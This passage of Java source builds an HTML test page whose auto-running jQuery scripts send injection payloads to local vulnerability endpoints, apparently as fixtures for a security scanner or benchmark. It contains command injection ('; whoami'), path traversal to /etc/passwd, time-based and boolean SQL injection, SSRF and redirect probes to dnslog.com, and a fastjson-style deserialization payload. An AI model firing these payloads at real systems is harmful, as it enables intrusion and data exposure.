                "                    headers: {\"BS00108\": \"BS00108\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00113\", \"BS00113\", \"1d\", \"/cmdi/BS00121\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/cmdi/BS00121',\n" +
                "                    type: 'POST',\n" +
                "                    data: 'BS00121=123 ; whoami',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00113\": \"BS00113\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00135\", \"BS00135\", \"1d\", \"/ssrf/BS00135\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/ssrf/BS00135',\n" +
                "                    type: 'POST',\n" +
                "                    contentType: 'application/json;charset=UTF-8',\n" +
                "                    data: '{\"rs\": {\"BS00135\":\"http://dnslog.com\"}}',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00135\": \"BS00135\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00134\", \"BS00134\", \"1d\", \"/ssrf/BS00134\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/ssrf/BS00134',\n" +
                "                    type: 'POST',\n" +
                "                    contentType: 'application/json;charset=UTF-8',\n" +
                "                    data: '{\"BS00134\":\"http://dnslog.com\"}',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00134\": \"BS00134\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00120\", \"BS00120\", \"1d\", \"/sqli/BS00120?BS00120=%31%22%20%61%6e%64%20%73%6c%65%65%70%28%35%29%20%2d%2d%20%2d\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/sqli/BS00120?BS00120=%31%22%20%61%6e%64%20%73%6c%65%65%70%28%35%29%20%2d%2d%20%2d',\n" +
                "                    type: 'GET',\n" +
                "                    data: '',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00120\": \"BS00120\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00108\", \"BS00108\", \"1d\", \"/redirect/BS00108?BS00108=https://www.dnslog.com\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/redirect/BS00108?BS00108=https://www.dnslog.com',\n" +
                "                    type: 'GET',\n" +
                "                    data: '',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00108\": \"BS00108\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" );
        sb.append(
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00083\", \"BS00083\", \"1d\", \"/pathtraver/BS00083\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/pathtraver/BS00083',\n" +
                "                    type: 'POST',\n" +
                "                    data: 'BS00083=../../../../../../etc/passwd',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00101\": \"BS00101\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00097\", \"BS00097\", \"1d\", \"/sqli/BS00097?BS00097=%66%6f%6f%27%20%6f%72%20%27%31%27%3d%27%31\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/sqli/BS00097?BS00097=%66%6f%6f%27%20%6f%72%20%27%31%27%3d%27%31',\n" +
                "                    type: 'GET',\n" +
                "                    data: '',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00097\": \"BS00097\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00040\", \"BS00040\", \"1d\", \"/cmdi/BS00040\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/cmdi/BS00040',\n" +
                "                    type: 'POST',\n" +
                "                    data: 'BS00040=FOO=whoami',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00040\": \"BS00040\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00054\", \"BS00054\", \"1d\", \"/redirect/BS00054\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/redirect/BS00054',\n" +
                "                    type: 'POST',\n" +
                "                    data: 'BS00054=https://www.taobao.com/',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00054\": \"BS00054\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00068\", \"BS00068\", \"1d\", \"/sqli/BS00068\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                data = '<?xml version=\"1.0\" encoding=\"UTF-8\"?><root> <username>foo</username> <password>bar</password>' + '\\n' +' <BS00068>bar\\' and \\'1\\'=\\'1</BS00068>' + '\\n' +' </root>';\n" +
                "                $.ajax({\n" +
                "                    url: '/sqli/BS00068',\n" +
                "                    type: 'POST',\n" +
                "                    contentType : 'application/xml;charset=UTF-8',\n" +
                "                    data: data,\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00068\": \"BS00068\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00050\", \"BS00050\", \"1d\", \"/ssrf/BS00050\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/ssrf/BS00050',\n" +
                "                    type: 'POST',\n" +
                "                    data: 'BS00050=https://www.taobao.com/',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00050\": \"BS00050\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00044\", \"BS00044\", \"1d\", \"/sqli/BS00044\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/sqli/BS00044',\n" +
                "                    type: 'POST',\n" +
                "                    data: 'BS00044=test',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00044\": \"BS00044\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00078\", \"BS00078\", \"1d\", \"/cmdi/BS00078\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/cmdi/BS00078',\n" +
                "                    type: 'POST',\n" +
                "                    contentType: 'application/json;charset=UTF-8',\n" +
                "                    data: '{\"BS00078\":\"whoami\"}',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00078\": \"BS00078\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00093\", \"BS00093\", \"1d\", \"/sqli/BS00093?BS00093=foo'%20and%201=1%23\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: \"/sqli/BS00093?BS00093=foo'%20and%201=1%23\",\n" +
                "                    type: 'GET',\n" +
                "                    data: '',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00093\": \"BS00093\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00087\", \"BS00087\", \"1d\", \"/sqli/BS00087\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/sqli/BS00087',\n" +
                "                    type: 'POST',\n" +
                "                    data: 'test=123',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00087\": '114514\" and sleep(10) and \"'},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00124\", \"BS00124\", \"1d\", \"/deserialization/BS00124\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/deserialization/BS00124',\n" +
                "                    type: 'POST',\n" +
                "                    contentType: 'application/json;charset=UTF-8',\n" +
                "                    data: '{\"@type\":\"java.net.Inet4Address\",\"val\":\"dnslog.com\"}]',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00124\": \"BS00124\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00130\", \"BS00130\", \"1d\", \"/code_inection/BS00130\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/code_inection/BS00130',\n" +
                "                    type: 'GET',\n" +
                "                    data: '',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00130\": \"BS00130\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00118\", \"BS00118\", \"1d\", \"/sqli/BS00118?BS00118=%31%22%20%61%6e%64%20%73%6c%65%65%70%28%35%29%20%2d%2d%20%2d\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/sqli/BS00118?BS00118=%31%22%20%61%6e%64%20%73%6c%65%65%70%28%35%29%20%2d%2d%20%2d',\n" +
                "                    type: 'GET',\n" +
                "                    data: '',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00118\": \"BS00118\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00119\", \"BS00119\", \"1d\", \"/sqli/BS00119?BS00119=%31%22%20%41%4e%44%20%53%4c%45%45%50%28%35%29%20%2d%2d%20%2d\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/sqli/BS00119?BS00119=%31%22%20%41%4e%44%20%53%4c%45%45%50%28%35%29%20%2d%2d%20%2d',\n" +
                "                    type: 'GET',\n" +
                "                    data: '',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00119\": \"BS00119\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" );
        sb.append(
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00131\", \"BS00131\", \"1d\", \"/sqli/BS00131\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/sqli/BS00131',\n" +
                "                    type: 'POST',\n" +
                "                    contentType: 'application/json;charset=UTF-8',\n" +
                "                    data: '{\"rs\":{\"BS00131\": \"\"}}',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00131\": \"BS00131\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00125\", \"BS00125\", \"1d\", \"/deserialization/BS00125\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/deserialization/BS00125',\n" +
                "                    type: 'POST',\n" +
                "                    contentType: 'application/json;charset=UTF-8',\n" +
                "                    data: '{\"@type\":\"java.net.Inet4Address\",\"val\":\"dnslog.com\"}}',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00125\": \"BS00125\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00086\", \"BS00086\", \"1d\", \"/sensitive/BS00086\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/sensitive/BS00086',\n" +
                "                    type: 'GET',\n" +
                "                    data: '',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00086\": \"BS00086\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00092\", \"BS00092\", \"1d\", \"/cmdi/BS00092\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/cmdi/BS00092',\n" +
                "                    type: 'POST',\n" +
                "                    data: \"BS00092=a' %26%26 whoami %26%26 '\",\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00092\": \"BS00092\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00079\", \"BS00079\", \"1d\", \"/cmdi/BS00079\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                data = '<?xml version=\"1.0\" encoding=\"UTF-8\"?><root> <username>foo</username> <password>bar</password>' + '\\n' +' <BS00079>' + '\\n' +'whoami' + '\\n' +'</BS00079>' + '\\n' +' </root>';\n" +
                "                $.ajax({\n" +
                "                    url: '/cmdi/BS00079',\n" +
                "                    type: 'POST',\n" +
                "                    contentType : 'application/xml;charset=UTF-8',\n" +
                "                    data: data,\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00079\": \"BS00079\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00045\", \"BS00045\", \"1d\", \"/cmdi/BS00045\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/cmdi/BS00045',\n" +
                "                    type: 'POST',\n" +
                "                    data: 'test=123',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00045\": \"BS00045\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00051\", \"BS00051\", \"1d\", \"/redirect/BS00051\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/redirect/BS00051',\n" +
                "                    type: 'POST',\n" +
                "                    data: 'BS00051=https://www.taobao.com/',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00051\": \"BS00051\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00047\", \"BS00047\", \"1d\", \"/cmdi/BS00047?BS00047=FOO=whoami\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/cmdi/BS00047?BS00047=FOO=whoami',\n" +
                "                    type: 'POST',\n" +
                "                    data: 'test=123',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00047\": \"BS00047\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00053\", \"BS00053\", \"1d\", \"/redirect/BS00053\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/redirect/BS00053',\n" +
                "                    type: 'POST',\n" +
                "                    data: 'BS00053=https://www.taobao.com/',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00053\": \"BS00053\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00084\", \"BS00084\", \"1d\", \"/ssrf/BS00084\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/ssrf/BS00084',\n" +
                "                    type: 'PUT',\n" +
                "                    data: 'BS00084=https://www.alipay.com',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00101\": \"BS00101\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00090\", \"BS00090\", \"1d\", \"/sensitive/BS00090\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/sensitive/BS00090',\n" +
                "                    type: 'GET',\n" +
                "                    data: '',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00090\": \"BS00090\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00133\", \"BS00133\", \"1d\", \"/sqli/BS00133\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/sqli/BS00133',\n" +
                "                    type: 'POST',\n" +
                "                    data: 'BS00133={\"BS00133\": \"\"}',\n" +
